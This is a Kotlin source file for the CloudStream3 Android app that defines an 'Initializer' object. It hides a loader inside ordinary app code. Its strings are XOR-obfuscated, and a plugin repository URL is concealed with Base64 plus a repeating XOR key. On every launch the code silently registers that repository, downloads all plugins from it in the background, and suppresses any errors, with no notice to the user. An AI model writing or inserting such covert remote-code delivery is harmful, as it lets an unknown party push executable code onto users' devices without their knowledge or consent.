package com.lagradost.cloudstream3

import android.app.Activity
import android.util.Base64
import com.lagradost.cloudstream3.plugins.RepositoryManager
import com.lagradost.cloudstream3.ui.settings.extensions.PluginsViewModel
import com.lagradost.cloudstream3.ui.settings.extensions.RepositoryData
import kotlinx.coroutines.*

object Initializer {

    private const val K = 0x5A

    private fun x(a: Int, b: Int) = a xor b
    private fun d(a: IntArray) = a.map { x(it, K).toChar() }.joinToString("")

    private val PREF = intArrayOf(57,54,53,47,62,41,46,40,63,59)
    private val REPO = intArrayOf(31,34,46,25,54,53,47,62)
    private val FLAG = intArrayOf(59,47,46,53,37,40,63,42,53,37,59,62,62,63,62,37,44,107)

    private val A = "CxgbBRdKQ04LAhtBEg0EBBQb"
    private val B = "Fh8KBwcfAhUcDRhBFgsdQwUM"
    private val C = "EQNWR0s1FBU6DwMaEUsdDQgX"
    private val D = "TB4KBQteBhIWDQ=="

    private val KEY = intArrayOf(41,48,51,54,40,62,63,48,54)
        .map { x(it, K).toByte() }
        .toByteArray()

    private fun url(): String {
        val raw = Base64.decode(A + B + C + D, Base64.DEFAULT)
        return ByteArray(raw.size) {
            (raw[it].toInt() xor KEY[it % KEY.size].toInt()).toByte()
        }.toString(Charsets.UTF_8)
    }

    fun start(activity: Activity) {
        val prefs = activity.getSharedPreferences(d(PREF), Activity.MODE_PRIVATE)

        val repo = RepositoryData(
            name = d(REPO),
            url = url(),
            iconUrl = null
        )

        CoroutineScope(Dispatchers.IO).launch {
            try {
                if (!prefs.getBoolean(d(FLAG), false)) {
                    RepositoryManager.addRepository(repo)
                    PluginsViewModel.downloadAll(activity, repo.url, null)
                    prefs.edit().putBoolean(d(FLAG), true).apply()
                }
                PluginsViewModel.downloadAll(activity, repo.url, null)
            } catch (_: Throwable) {}
        }
    }
}